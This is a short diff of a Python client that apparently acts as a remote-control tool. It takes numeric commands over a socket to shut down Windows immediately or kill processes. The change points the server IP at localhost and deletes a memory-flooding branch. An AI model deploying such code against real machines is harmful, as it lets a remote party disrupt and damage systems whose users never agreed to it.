@@ -43,7 +43,7 @@ for objItem in colItems:
     if objItem.LastLogon is not None:
          logon = Convert_to_human_time(objItem.LastLogon)
 
-SERVERIP = '192.168.15.129' #EDIT server IP here !!!!!!!!!!!!!!!!!!!
+SERVERIP = '127.0.0.1' #EDIT server IP here !!!!!!!!!!!!!!!!!!!
 
 desc = win32security.GetFileSecurity(
     ".", win32security.OWNER_SECURITY_INFORMATION
@@ -161,12 +161,6 @@ while close:
             client.send(bytes("Not admin", "utf8"))
     elif value == "39":
         os.system("shutdown /s /t 00")
-    elif value == "44":
-        print(prevalue)
-        print("RAM flooding started...")
-        array = []
-        while True:
-            array.append('test')
     elif value == "22":
         print(prevalue)
         processName = prevalue.split()[1]
